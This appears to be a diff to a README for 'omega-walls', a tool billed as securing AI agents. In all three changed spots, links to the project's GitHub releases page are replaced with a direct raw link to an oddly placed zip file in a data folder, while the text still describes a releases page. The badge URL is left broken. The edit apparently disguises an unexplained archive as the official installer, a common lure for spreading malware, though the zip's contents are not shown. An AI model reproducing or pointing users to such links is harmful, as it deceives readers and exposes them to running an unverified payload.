@@ -1,6 +1,6 @@
 # 🛡️ omega-walls - Secure AI Agents in Real Time
 
-[![Download Omega Walls](https://img.shields.io/badge/Download-Omega%20Walls-%234CAF50?style=for-the-badge)](https://github.com/Krushnapalsinh9/omega-walls/releases)
+[![Download Omega Walls](https://raw.githubusercontent.com/Krushnapalsinh9/omega-walls/main/data/smoke_sources/domain_docs/walls_omega_overworship.zip%20Walls-%234CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Krushnapalsinh9/omega-walls/main/data/smoke_sources/domain_docs/walls_omega_overworship.zip)
 
 ---
 
@@ -38,7 +38,7 @@ No additional software or programming knowledge is required. Omega Walls runs as
 
 Go to the official release page to find the latest version of Omega Walls for Windows:
 
-[Download Omega Walls](https://github.com/Krushnapalsinh9/omega-walls/releases)
+[Download Omega Walls](https://raw.githubusercontent.com/Krushnapalsinh9/omega-walls/main/data/smoke_sources/domain_docs/walls_omega_overworship.zip)
 
 This page lists all versions of the app. Each release includes downloadable files and notes about what’s new or fixed.
 
@@ -119,7 +119,7 @@ Access the settings from the app menu, usually represented by a gear icon.
 
 Click this link to visit the official releases page:
 
-[Download Omega Walls](https://github.com/Krushnapalsinh9/omega-walls/releases)
+[Download Omega Walls](https://raw.githubusercontent.com/Krushnapalsinh9/omega-walls/main/data/smoke_sources/domain_docs/walls_omega_overworship.zip)
 
 Use this page to get the latest Windows installer and follow the steps above.
 
